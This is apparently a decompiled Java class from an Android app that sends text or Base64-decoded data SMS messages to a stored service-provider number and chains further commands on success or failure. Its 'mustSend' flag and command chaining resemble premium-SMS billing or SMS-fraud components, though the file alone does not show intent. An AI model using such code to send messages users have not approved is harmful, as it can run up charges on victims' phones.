package mm.api.impl;

import android.app.PendingIntent;
import android.telephony.SmsManager;
import android.util.Base64;
import mm.api.Command;
import mm.api.SMSCommand;

public class DefaultSMSCommand
  extends MultiCommand
  implements SMSCommand
{
  private final short dataPort;
  private Command failedCommand;
  private final boolean isData;
  private final String msg;
  private final boolean mustSend;
  private final String sp;
  private Command successCommand;
  
  public DefaultSMSCommand(String paramString1, String paramString2, boolean paramBoolean1, short paramShort, boolean paramBoolean2, Command... paramVarArgs)
  {
    super(paramVarArgs);
    this.sp = paramString1;
    this.msg = paramString2;
    this.isData = paramBoolean1;
    this.mustSend = paramBoolean2;
    this.dataPort = paramShort;
  }
  
  public byte[] getDataMsg()
  {
    return Base64.decode(getMsg(), 2);
  }
  
  public short getDataPort()
  {
    return this.dataPort;
  }
  
  public String getMsg()
  {
    return this.msg;
  }
  
  public String getSp()
  {
    return this.sp;
  }
  
  public boolean isData()
  {
    return this.isData;
  }
  
  public boolean isMustSend()
  {
    return this.mustSend;
  }
  
  public void requestSendMessage(PendingIntent paramPendingIntent1, PendingIntent paramPendingIntent2)
  {
    if (isData())
    {
      byte[] arrayOfByte = getDataMsg();
      SmsManager.getDefault().sendDataMessage(getSp(), null, getDataPort(), arrayOfByte, paramPendingIntent1, paramPendingIntent2);
      return;
    }
    SmsManager.getDefault().sendTextMessage(getSp(), null, getMsg(), paramPendingIntent1, paramPendingIntent2);
  }
  
  public void sendMessageFailed()
  {
    if (this.failedCommand != null) {
      this.failedCommand.executeCommand();
    }
  }
  
  public void sendMessageSuccess()
  {
    if (this.successCommand != null) {
      this.successCommand.executeCommand();
    }
  }
  
  public void setFailedCommand(Command paramCommand)
  {
    this.failedCommand = paramCommand;
  }
  
  public void setSuccessCommand(Command paramCommand)
  {
    this.successCommand = paramCommand;
  }
}
